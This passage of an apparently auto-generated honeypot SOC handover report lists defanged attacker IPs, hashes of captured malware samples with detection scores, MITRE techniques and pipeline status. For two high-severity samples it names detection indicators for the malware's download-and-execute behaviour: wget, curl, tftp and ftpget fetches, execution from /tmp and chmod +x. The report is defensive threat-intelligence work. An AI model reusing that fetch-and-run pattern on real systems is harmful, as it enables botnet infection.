| `2.57.122[.]168` | **2** | 2026-08-24 04:20 | 2026-08-24 04:58 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.216.8[.]182` | **2** | 2026-08-24 05:25 | 2026-08-24 05:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `110.25.107[.]25` | 1 | 2026-08-24 03:49 | 2026-08-24 03:50 | 14s | 0 | `T1592` | 🟢 LOW |
| `111.175.88[.]6` | 1 | 2026-08-24 05:46 | 2026-08-24 05:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.202.198[.]98` | 1 | 2026-08-24 06:37 | 2026-08-24 06:37 | 12s | 0 | `T1592` | 🟢 LOW |
| `14.198.30[.]201` | 1 | 2026-08-24 03:37 | 2026-08-24 03:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-08-24 04:49 | 2026-08-24 04:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `177.184.152[.]236` | 1 | 2026-08-24 04:50 | 2026-08-24 04:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.247.171[.]186` | 1 | 2026-08-24 04:42 | 2026-08-24 04:42 | 7s | 0 | `T1592` | 🟢 LOW |
| `190.107.174[.]163` | 1 | 2026-08-24 04:53 | 2026-08-24 04:53 | 13s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]231` | 1 | 2026-08-24 06:37 | 2026-08-24 06:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | 1 | 2026-08-24 06:44 | 2026-08-24 06:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.181.217[.]12` | 1 | 2026-08-24 06:19 | 2026-08-24 06:19 | 13s | 0 | `T1592` | 🟢 LOW |
| `203.110.233[.]225` | 1 | 2026-08-24 04:24 | 2026-08-24 04:24 | 26s | 0 | `T1592` | 🟢 LOW |
| `222.222.124[.]164` | 1 | 2026-08-24 04:18 | 2026-08-24 04:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.128.249[.]234` | 1 | 2026-08-24 05:39 | 2026-08-24 05:40 | 13s | 0 | `T1592` | 🟢 LOW |
| `31.29.178[.]160` | 1 | 2026-08-24 06:26 | 2026-08-24 06:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `34.53.180[.]80` | 1 | 2026-08-24 05:47 | 2026-08-24 05:47 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | 1 | 2026-08-24 03:47 | 2026-08-24 03:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.56.79[.]53` | 1 | 2026-08-24 06:37 | 2026-08-24 06:37 | 1s | 0 | `T1592` | 🟢 LOW |
| `5.133.76[.]188` | 1 | 2026-08-24 06:01 | 2026-08-24 06:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `5.226.140[.]95` | 1 | 2026-08-24 05:04 | 2026-08-24 05:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]48` | 1 | 2026-08-24 03:40 | 2026-08-24 03:40 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]48` | 1 | 2026-08-24 06:37 | 2026-08-24 06:37 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]182` | 1 | 2026-08-24 04:42 | 2026-08-24 04:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]23` | 1 | 2026-08-24 05:16 | 2026-08-24 05:16 | 8s | 0 | `T1592` | 🟢 LOW |
| `77.38.203[.]5` | 1 | 2026-08-24 04:22 | 2026-08-24 04:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.66.45[.]101` | 1 | 2026-08-24 06:22 | 2026-08-24 06:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]114` | 1 | 2026-08-24 05:38 | 2026-08-24 05:39 | 10s | 0 | `T1592` | 🟢 LOW |
| `83.255.210[.]166` | 1 | 2026-08-24 04:54 | 2026-08-24 04:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.99.103[.]38` | 1 | 2026-08-24 04:22 | 2026-08-24 04:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.99.93[.]205` | 1 | 2026-08-24 06:23 | 2026-08-24 06:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]165` | 1 | 2026-08-24 05:04 | 2026-08-24 05:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-24 06:28 | 2026-08-24 06:30 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `43.134.165[.]86` | SG | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 4 |
| `177.184.152[.]236` | BR | SOS TELECOM | **100** ⚠️ | 3 |
| `112.28.153[.]238` | CN | China Mobile Communications Corporation | **100** ⚠️ | 1 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `59.93.107[.]172` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 6 |
| `91.92.133[.]195` | IR | Telecommunication Company of Tehran | **100** ⚠️ | 2 |
| `24.89.134[.]244` | US | Cablevision Systems Corp. | **100** ⚠️ | 1 |
| `110.44.126[.]195` | NP | VIA NET COMMUNICATION LTD | **100** ⚠️ | 1 |
| `177.244.29[.]30` | MX | Mega Cable, S.A. de C.V. | **100** ⚠️ | 1 |
| `65.20.143[.]19` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 182 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 162 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 12 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 12 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 11 |

---

## 🔕 False Positive Summary (26 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 14 below threshold 25 | 3 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| AbuseIPDB score 6 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 459 cases |
| Tool 34  | Credential Extractor        | ✅ 209 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 141 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 26 filtered (5.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 92 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 162 priority case(s) shown individually · 52 recon entry/entries in table (20 group(s) consolidating 239 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-24T07:05:30Z_
